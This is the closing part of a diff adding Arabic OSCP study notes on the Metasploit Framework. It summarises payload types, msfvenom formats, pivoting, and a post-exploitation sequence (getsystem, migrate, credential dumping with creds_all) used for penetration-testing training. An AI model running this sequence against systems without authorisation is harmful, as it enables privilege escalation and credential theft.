+<li>Staged (/) = أصغر وأخفت | Non-Staged (_) = أكثر استقراراً — الاختيار يعتمد على Buffer Size</li>
+<li>Meterpreter = أقوى Payload: في الذاكرة، مُشفَّر، موسَّع، متعدد المنصات</li>
+<li>msfvenom يولَّد Payloads بكل الصيغ (exe, elf, ps1, aspx, dll, apk)</li>
+<li>بعد Session: getuid → getsystem → migrate → creds_all (Kiwi) — هذا الترتيب الصحيح</li>
+<li>Pivoting: Routes للـ MSF Modules فقط | SOCKS+Proxychains لكل الأدوات | Port Forward لخدمة محدَّدة</li>
+<li>Resource Scripts تُلغي التكرار — listener.rc مع AutoRunScript يعمل تلقائياً كاملاً</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>MSF مش مجرد أداة — هو بيئة عمل كاملة.</strong> المختبر الذي يفهم كيف يربط Auxiliary بـ Exploit بـ Post بـ Pivot في Console واحد، يتحوَّل من مهاجم تكتيكي لمهاجم استراتيجي قادر على خرق شبكات كاملة بمنهجية.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">★ Professional Mindset</div>
+<p>ابدأ دايماً بـ <code>workspace -a &lt;client&gt;</code> → <code>db_nmap</code> → auxiliary للاستكشاف → exploit بالـ Rank الأعلى → فور الـ Session: migrate، getsystem، creds_all → autoroute → SOCKS → lateral. كل خطوة منظَّمة في الـ DB — لا تبدأ من جديد في كل Engagement.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول الثامن عشر — OSCP: The Metasploit Framework</em></p>
+<div class="footer-note">-- EOF: module-18/metasploit-framework.md --</div>
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
